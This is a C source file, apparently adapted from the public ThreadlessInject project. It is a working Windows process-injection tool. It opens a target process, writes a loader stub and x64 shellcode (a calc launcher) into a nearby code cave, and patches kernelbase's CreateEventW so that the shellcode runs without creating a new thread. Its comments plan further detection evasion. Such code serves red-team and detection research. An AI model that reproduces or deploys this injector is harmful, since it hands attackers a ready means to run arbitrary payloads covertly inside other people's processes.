/*
* 
* Based on CCob's TheadlessInject. https://github.com/CCob/ThreadlessInject/tree/master
* 
*/

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>

// comment out to suppress output
//
#define _DBG

#ifdef _DBG
#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DEBUG_PRINT(x, ...)
#define _INT
#endif

#define CODE_CAVE_RANGE 0x75000000
#define CONV(x) (UINT_PTR)x
// TODO: string hashing
#define TARGET_DLL L"kernelbase.dll"

// choosing a target function to patch
// api monitor is good help
// for most processes
//
#define TARGET_EXP_FUNC "CreateEventW"
// other choices
//\
#define TARGET_EXP_FUNC "MapViewOfFileEx"

FARPROC NtWriteVirtualMemory = NULL;
FARPROC NtProtectVirtualMemory = NULL;

unsigned char ldrStub[] = {
    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
	0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
	0xE0, 0x90,
    //
    // append shellcode
    // calcx64
    //
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

unsigned char callStub[] = {
    0xE8, 0x44, 0x33, 0x22, 0x11
};

//
// List all loaded dll in target process and finds the space above
// the target dll. We'll be allocating buffer for loaderStub + shellcode in the empty
// space
//
VOID FindDllBaseAndEmptySpace(_In_ HANDLE hProc, _Out_ PVOID* ppDllBase)
{
    HMODULE hMods[1024] = { 0x0 };
    DWORD dwBytesNeeded = 0x0;

    // Enumerate the loaded modules of the process
    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &dwBytesNeeded))
    {
        int nmbrOfMods = dwBytesNeeded / sizeof(HMODULE);

		DEBUG_PRINT("\n[*]Loaded module info: \n");
        // Print the sorted module addresses
        for (int i = 0; i < nmbrOfMods; i++)
        {
            MODULEINFO mi = { 0x0 };
            WCHAR modName[MAX_PATH] = { 0x0 };
            GetModuleInformation(hProc, hMods[i], &mi, sizeof(mi));
            GetModuleBaseName(hProc, hMods[i], modName, MAX_PATH);

			if (0 == _wcsicmp(modName, TARGET_DLL))
			{
				*ppDllBase = mi.lpBaseOfDll;
#ifndef _DBG
				break;
#endif
			}

			DEBUG_PRINT("\t0x%p <<<<<<<<< %ws\n", mi.lpBaseOfDll, modName);
        }
    }
}

//
// Allocate buffer in the empty space, make sure the buffer address is
// close to the 'call near, relative' instruction (0xe8)
//
BOOL FindCodeCave(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ DWORD64 dwDllSpace, _In_ SIZE_T sShellcode, _In_ _Out_ PVOID* ppCodeCave)
{
    FARPROC NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
    DEBUG_PRINT("\t0x%p <<<<<<<<< Address of 'NtAllocateVirtualMemory'\n", NtAllocateVirtualMemory);

    NTSTATUS status = 0x0;

    // make sure the code cave is within 2GB range of target function
    for (*ppCodeCave = CONV(pExpAddr) - CODE_CAVE_RANGE;
        *ppCodeCave < CONV(pExpAddr) + CODE_CAVE_RANGE;
        CONV(*ppCodeCave) += 0x1000)
    {
        status = NtAllocateVirtualMemory(hProc, ppCodeCave, 0, &sShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (0x0 != status) continue;
        break;
    }

    if (NULL == *ppCodeCave)
        return FALSE;

	return TRUE;
}

//
// Generate complete loader stub with original 8 bytes from target function
//
VOID GenerateLoaderStub(_In_ PVOID originalBytes, _In_ SIZE_T sOriginalBytes)
{
    *(UINT_PTR*)(ldrStub + 18) = *(PUCHAR*)originalBytes;
#ifdef _DBG
    DEBUG_PRINT("\n\n[*]Generated loader stub:\n\t");
    for (DWORD i = 0; i < sizeof(ldrStub); i++)
        DEBUG_PRINT("%.2X ", ldrStub[i]);
    DEBUG_PRINT("\n\n");
#endif
}

//
// Write call stub into target function
//
BOOL PatchExportedFunc(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ PVOID pRelLdrAddr, _In_ SIZE_T sCallStub)
{
    *(UINT_PTR*)(callStub + 1) = CONV(pRelLdrAddr) & 0xFFFFFFFF;

#ifdef _DBG
    DEBUG_PRINT("\n\t[*]Generated call stub:\n\t\t");
    for (DWORD i = 0; i < sizeof(callStub); i++)
    {
        DEBUG_PRINT("%.2X ", callStub[i]);
    }
    DEBUG_PRINT("\n");
#endif

    DEBUG_PRINT("\t[*]Patching target function ...");
    DWORD dwBytesWritten = 0x0;
    NTSTATUS status = 0x0;

    if (0x0 != (status = NtWriteVirtualMemory(hProc, pExpAddr, callStub, sCallStub, &dwBytesWritten)) || dwBytesWritten != sCallStub)
    {
        DEBUG_PRINT("\t\t[-]Failed to patch target function with call stub ...\n");
        return FALSE;
    }

    DEBUG_PRINT(" Done... %d bytes of call stub written to target function @ >>>>>>>>> 0x%p...\n", dwBytesWritten, pExpAddr);
    DEBUG_PRINT("\t[*]Press <Enter> to continue ...");
    _INT;
}

//
// wait for execution, compare the beginning of target function with original bytes
// if the bytes have been restored, cleanup and quit
//
VOID WaitForExecution(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ SIZE_T sBufSize, _In_ PVOID pOriginalInstBytesBuf)
{
	DEBUG_PRINT("[*]Wait for 60s before exit ... \n");
    PVOID pCurrrenInstBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufSize);
	DWORD sBytesRead = 0x0;

    time_t startTime = time(NULL);
    int elapsed = 0x0;

    while (elapsed < 60)
    {
		if (!ReadProcessMemory(hProc, pExpAddr, pCurrrenInstBuf, sBufSize, &sBytesRead) || sBytesRead != sBufSize)
		{
			DEBUG_PRINT("[-]Failed to read process memory with error: 0x%.8x\n", GetLastError());
			return FALSE;
		}

        if (0 == memcmp(pCurrrenInstBuf, pOriginalInstBytesBuf, sBufSize))
        {
			DEBUG_PRINT("\t[+]Payload executed ... cleanup ...\n");
            break;
        }

        Sleep(1000);
        elapsed = (int)(time(NULL) - startTime);
    }

	HeapFree(GetProcessHeap(), 0, pCurrrenInstBuf);
}

int main(int argc, char** argv)
{
    if (argc < 2)
    {
        DEBUG_PRINT("[-]Usage: %s <Process ID> ...\n", argv[0]);
        return -1;
    }

    HANDLE hProc = INVALID_HANDLE_VALUE;
    PVOID pCodeCaveAddr = NULL;
    PVOID pDllBase = NULL;
    PVOID pExpAddr = NULL;
    PVOID pRelLdrAddr = NULL;
    PVOID pOriginalInstBytesBuf = NULL;
    DWORD dwProcId = 0x0;
    DWORD dwBytesWritten = 0x0;
    DWORD dwOldProtect = 0x0;
    DWORD64 dwDllSpace = 0x0;
    SIZE_T sLdrStub = sizeof(ldrStub);
    SIZE_T sCallStub = sizeof(callStub);
	SIZE_T sBufSize = 0x8;
    SIZE_T sBytesRead = 0x0;
    NTSTATUS status = 0x0;

	DEBUG_PRINT("\n|===================================================START=======================================================|\n");

    // TODO: syscall
    NtWriteVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");
    NtProtectVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtProtectVirtualMemory");

    DEBUG_PRINT("\n[*]Nt function address:");
    DEBUG_PRINT("\n\t0x%p <<<<<<<<< Address of 'NtWriteVirtualMemory'\n", NtWriteVirtualMemory);
    DEBUG_PRINT("\t0x%p <<<<<<<<< Address of 'NtProtectVirtualMemory'\n", NtProtectVirtualMemory);

    dwProcId = atoi(argv[1]);
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcId);
    if (INVALID_HANDLE_VALUE == hProc)
    {
        DEBUG_PRINT("[-]Failed to open process with error: 0x%.8x", GetLastError());
        goto _exit;
    }

    FindDllBaseAndEmptySpace(hProc, &pDllBase);

    DEBUG_PRINT("\n[*]Payload memory info: \n");

    if (NULL == pDllBase)
    {
        DEBUG_PRINT("[-]Failed to resolve Dll base for %ws", TARGET_DLL);
        goto _exit;
    }

	DEBUG_PRINT("\t0x%p <<<<<<<<< Base Address of '%ws'\n", pDllBase, TARGET_DLL);

    // TODO: hash
    pExpAddr = GetProcAddress(GetModuleHandleW(TARGET_DLL), TARGET_EXP_FUNC);
    DEBUG_PRINT("\t0x%p <<<<<<<<< Address of exported function '%s'\n", pExpAddr, TARGET_EXP_FUNC);

    // allocate buffer to hold our loaderStub + shellcode
    if (!FindCodeCave(hProc, pExpAddr, dwDllSpace, sLdrStub, &pCodeCaveAddr))
    {
		DEBUG_PRINT("[-]Failed to find memory space ...\n");
        goto _exit;
    }

    DEBUG_PRINT("\t0x%p <<<<<<<<< Address of code cave\n", pCodeCaveAddr);
    DEBUG_PRINT("\n[*]Write loader stub to code cave ... ");

    //
    // read 8 bytes of original instructions from target function
    // will be used to restore the function after calling shellcode
    //
 	pOriginalInstBytesBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufSize);
    if (NULL == pOriginalInstBytesBuf)
    {
        DEBUG_PRINT("[-]Failed to allocate buffer with error: 0x%.8x\n", GetLastError());
        goto _exit;
    }

    if (!ReadProcessMemory(hProc, pExpAddr, pOriginalInstBytesBuf, sBufSize, &sBytesRead) || sBytesRead != sBufSize)
    {
        DEBUG_PRINT("[-]Failed to read process memory with error: 0x%.8x\n", GetLastError());
        goto _exit;
    }

#ifdef _DBG
    DEBUG_PRINT("\n[*]%d bytes read from target function '%s':\n\t", sBytesRead, TARGET_EXP_FUNC);
    for (WORD i = 0; i < sBytesRead; i++)
        DEBUG_PRINT("0x%.2X ", ((PUCHAR)pOriginalInstBytesBuf)[i]);
#endif

    // insert original bytes into loader stub
    GenerateLoaderStub(pOriginalInstBytesBuf, sBufSize);

    //
    // this is to address the problem that on certain versions (including windows 11 22H2)
    // allocating the code cave as PAGE_READWRITE is not enough, have to explicitly invoke
    // protect API to mark it as PAGE_READWRITE for the write process to succeed
    //
    PVOID pTmpCodeCaveAddr = pCodeCaveAddr;
    if (0x0 != (status = NtProtectVirtualMemory(hProc, &pTmpCodeCaveAddr, &sCallStub, PAGE_READWRITE, &dwOldProtect)))
    {
        DEBUG_PRINT("[-]Failed to change memory protection for code cave before writing with error: 0x%.8x\n", GetLastError());
        goto _exit;
    }

    // TODO: syscall
    // write loader stub
    if (0x0 != (status = NtWriteVirtualMemory(hProc, pCodeCaveAddr, ldrStub, sLdrStub, &dwBytesWritten)) || dwBytesWritten != sLdrStub)
    {
        DEBUG_PRINT("[-]Failed to write loader stub with error: 0x%.8x\n", GetLastError());
        goto _exit;
    }

    if (0x0 != (status = NtProtectVirtualMemory(hProc, &pCodeCaveAddr, &sLdrStub, PAGE_EXECUTE_READ, &dwOldProtect)))
        DEBUG_PRINT("[-]Failed to change memory protection for code cave with error: 0x%.8x\n", GetLastError());

    DEBUG_PRINT("Done ... %d bytes of loader stub written ...\n", dwBytesWritten);
    
    DEBUG_PRINT("[*]Patch target function '%s'\n", TARGET_EXP_FUNC);
    // calculate relative address of loader stub, accounting the 5-byte call opcode
    pRelLdrAddr = (PVOID)(CONV(pCodeCaveAddr) - (CONV(pExpAddr) + 5));
    DEBUG_PRINT("\t0x%p <<<<<<<<< Relative loader address\n", pRelLdrAddr);

    DEBUG_PRINT("\t[*]Change target function memory protection to RWX ...");
    
    PVOID pTmpExpAddr = pExpAddr;
    if (0x0 != (status = NtProtectVirtualMemory(hProc, &pTmpExpAddr, &sCallStub, PAGE_EXECUTE_READWRITE, &dwOldProtect)))
    {
        DEBUG_PRINT("[-]Failed to change memory protection for target function with error: 0x%.8x\n", GetLastError());
        goto _exit;
    }

    // write relative call opcodes to taget function
    PatchExportedFunc(hProc, pExpAddr, pRelLdrAddr, sizeof(callStub));

    WaitForExecution(hProc, pExpAddr, sBufSize, pOriginalInstBytesBuf);

    // flip memory protection back
    if (0x0 != (status = NtProtectVirtualMemory(hProc, &pExpAddr, &sCallStub, dwOldProtect, &dwOldProtect)))
        DEBUG_PRINT("[-]Failed to change memory protection in cleanup with error: 0x%.8x\n", GetLastError());

_exit:
    if (NULL != hProc)
        CloseHandle(hProc);
    if (NULL != pOriginalInstBytesBuf)
        HeapFree(GetProcessHeap(), 0, pOriginalInstBytesBuf);

	DEBUG_PRINT("\n|==================================================END=========================================================|\n\n");

    return 0;
}
